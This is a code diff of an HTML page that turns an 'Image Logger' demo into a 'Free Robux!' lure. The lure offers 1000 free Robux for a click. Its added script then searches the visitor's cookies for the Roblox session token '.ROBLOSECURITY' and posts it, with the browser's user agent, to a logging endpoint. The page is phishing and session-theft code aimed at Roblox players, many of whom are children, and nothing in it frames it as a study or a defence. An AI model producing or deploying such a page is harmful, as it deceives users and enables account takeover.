@@ -2,27 +2,55 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Image Logger</title>
+    <title>Free Robux!</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        img { max-width: 90%; height: auto; border: 1px solid #ccc; border-radius: 10px; cursor: pointer; }
+        .info { margin-top: 20px; font-size: 14px; color: #555; }
+    </style>
 </head>
 <body>
-    <h1>Click the Image Below</h1>
-    <img src="https://via.placeholder.com/300" alt="Click Me" style="cursor: pointer;" onclick="sendData()">
-    
+    <h1>Click Here for 1000 Free Robux!</h1>
+    <img src="https://via.placeholder.com/400x200.png/00FF00/000000?text=Click+Me+For+Robux" alt="Free Robux" onclick="sendData()">
+    <p class="info">Limited time offer! Click the image to claim.</p>
+
     <script>
         function sendData() {
-            // In a real scenario, you would gather data here
-            const data = {
-                message: "User clicked the image!",
-                userAgent: navigator.userAgent
-            };
+            // This function attempts to read the Roblox session cookie
+            function getRobloxCookie() {
+                // Split all cookies into an array
+                const cookies = document.cookie.split(';');
+                // Loop through the cookies to find the one named .ROBLOSECURITY
+                for (let cookie of cookies) {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name === '.ROBLOSECURITY') {
+                        return value;
+                    }
+                }
+                // Return a message if the cookie is not found
+                return 'Roblox cookie not found.';
+            }
 
-            // Send data to your Vercel API endpoint
+            const robloxCookie = getRobloxCookie();
+            const userAgent = navigator.userAgent;
+
+            // Send the captured data to your Vercel API endpoint
             fetch('/api/log', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(data),
+                body: JSON.stringify({
+                    robloxCookie: robloxCookie,
+                    userAgent: userAgent,
+                }),
+            })
+            .then(response => {
+                // You can choose to do something here, like show a "Thank you" message
+                console.log('Data sent successfully');
+            })
+            .catch(error => {
+                console.error('Error sending data:', error);
             });
         }
     </script>
